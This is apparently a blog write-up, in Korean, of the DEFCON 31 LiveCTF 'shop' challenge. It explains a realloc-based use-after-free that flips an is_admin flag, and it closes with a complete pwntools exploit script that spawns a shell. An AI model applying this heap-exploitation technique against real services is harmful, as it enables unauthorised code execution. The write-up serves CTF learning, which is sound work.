+++
title = "DEFCON 31 LiveCTF - shop"
date = "2024-07-16"
description = "DEFCON 31 LiveCTF pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "realloc", "uaf"]
+++

## 0x00. Introduction
``` bash
[*] '/home/user/uaf'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Structures
``` c
struct credential {
    char is_admin;      // alignment 때문에 어차피 8바이트를 차지
    struct shelf *shelf_ptr;
    char *username;
    char *password;
    struct credential *next_cred;
}

struct shelf {
    long count;
    struct item *item_ptr;
}

struct item {
    long number;
    long price;
    char *name;
    char *description;
}
```

### Goal
``` c
unsigned __int64 hidden_1C83()
{
  unsigned __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  if ( LOBYTE(login_info_4108->is_admin) )
    system("/bin/sh");
  else
    puts("Not an admin");
  return v1 - __readfsqword(0x28u);
}
```

로그인 이후의 메뉴에서 7번을 선택하면 호출되는 숨겨진 `hidden_1C83()`이 존재한다.
여기에서 `login_info`의 첫 바이트, 즉 `is_admin`의 값이 0이 아니면 쉘을 띄워준다.


## 0x01. Vulnerability
``` c
unsigned __int64 add_item_1357()
{
  ...
      tmp = realloc(shelf_ptr->item_ptr, 0x20 * (shelf_ptr->count + 1));
      if ( tmp )
      {
        ++shelf_ptr->count;
        shelf_ptr->item_ptr = tmp;
        memcpy(&shelf_ptr->item_ptr[shelf_ptr->count - 1], &selected, sizeof(shelf_ptr->item_ptr[shelf_ptr->count - 1]));
      }
  ...
}

unsigned __int64 remove_item_14B6()
{
  ...
      tmp = realloc(shelf_ptr->item_ptr, 0x20 * (shelf_ptr->count - 1));
      if ( tmp )
      {
        --shelf_ptr->count;
        shelf_ptr->item_ptr = tmp;
      }
      else
      {
        puts("Error removing item");
      }
  ...
}
```

`add_item_1357()`에서 item을 추가하면 `item_ptr`에 힙 영역이 할당된다.
이것을 `remove_item_14B6()`에서 item을 삭제할 때 청크 사이즈만 줄여서 재할당하는데 사이즈가 0이 됐을 때 `realloc()`에서 `NULL`이 리턴된다.

그런데 `shelf_ptr->item_ptr`의 값이 초기화되지 않고 그대로 남아있고, 삭제 이후 다시 `add_item_1357()`을 호출할 때 해제된 영역에 접근이 가능하기 때문에 UAF 취약점이 존재한다.


## 0x02. Exploit
``` c
unsigned __int64 open_account_1932()
{
  ...
      tmp = malloc(0x28uLL);
      LOBYTE(tmp->is_admin) = 0;
  ...
}
```

`open_account_1932()`를 보면 계정을 생성하고 바로 `is_admin`을 0으로 만든다.

따라서 A 계정을 만들고 `item`을 추가 후 삭제하여 해제된 영역을 B 계정의 `credential` 구조체가 가리키도록 exploit을 구성했다.

- open_account A
- add_item 1
- remove_item 0
- logout
- open_account B

이러한 순서로 페이로드를 작성해서, A의 `item_ptr`과 B의 `credential`이 같은 영역에 위치하게 만들 수 있고,

- login as A
- add_item 2

다시 A로 로그인한 후에 item을 추가해서 `item->number`를 복사하는 과정에서 `is_admin`이 덮이는 시나리오를 생각했으나...

``` bash
# Credential of B - BEFORE
gef➤  x/5gx 0x0000555555559330
0x555555559330: 0x0000000555555500      0x00005555555593a0
0x555555559340: 0x0000555555559360      0x0000555555559380
0x555555559350: 0x0000000000000000

# Credential of B - AFTER
gef➤  x/5gx 0x0000555555559330
0x555555559330: 0x0000000555555559      0x4ec540a62b019163
0x555555559340: 0x0000555555559360      0x0000555555559380
0x555555559350: 0x0000000000000000
```

쉘이 떨어져서 실제 값이 잘 덮였는지 확인해보니 `item->number`가 아닌 해제된 chunk의 메타 데이터로 덮여있었다.

곰곰이 생각해보니 다음과 같은 문제가 있었다.

1. `remove_item_14B6()`에서 `realloc()`이 `NULL`을 리턴해서 `item_ptr` 초기화는 물론 `count` 값도 작아지지 않음
2. 다시 `add_item_1357()`를 하는 과정에서 `count` 값이 아직 1이므로 0x40만큼 `realloc()`을 요청함
3. 사이즈도 맞지 않거니와 B의 `credential`이 있는 영역은 다시 `free`된 적도 없기 때문에 아예 다른 영역이 할당됨

결과적으로는 `realloc` 과정에서 메타 데이터가 쓰여지면서 `is_admin`이 덮이게 되어 다행히 exploit이 성공한다.
어쩌다 보니 unintended solution으로 푼 것 같다... ㅋㅋㅋㅋ


## 0x03. Payload
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
import sys

BINARY = "uaf"
LIBRARY = "libc.so.6"

code_base = 0x0000555555554000
bp = {
    'main' : code_base + 0x1DC7,
    'open_account' : code_base + 0x1932,
    'hidden' : code_base + 0x1C83,
}

gs = f'''
b *{bp['open_account']}
b *{bp['hidden']}
continue
'''
context.terminal = ['tmux', 'splitw', '-hf']

def menu(s, inputs: list) :
    for i in range(len(inputs)):
        r = s.recvuntil(b': ').decode()
        if i == 0:
            print(r.split('\n')[int(inputs[i]) - 1])
        s.sendline(inputs[i].encode())
    return

def main():
    if(len(sys.argv) > 1):
        s = remote("0.0.0.0", int(sys.argv[1]))
    else:
        s = process(BINARY, env={"LD_PRELOAD" : LIBRARY})
        gdb.attach(s, gs)
    elf = ELF(BINARY)
    lib = ELF(LIBRARY)

    menu(s, ['2', 'aaaa', '1111'])  # open_account of A
    menu(s, ['2', '1'])             # add_item 1
    menu(s, ['3', '0'])             # remove_item 0
    menu(s, ['5'])                  # logout
    menu(s, ['2', 'bbbb', '2222'])  # open_account of B
    menu(s, ['5'])                  # logout
    menu(s, ['3', 'aaaa', '1111'])  # login as A
    menu(s, ['2', '2'])             # add_item 2
    menu(s, ['5'])                  # logout
    menu(s, ['3', 'bbbb', '2222'])  # login as B
    menu(s, ['7'])                  # hidden
    s.interactive()

if __name__=='__main__':
    main()
```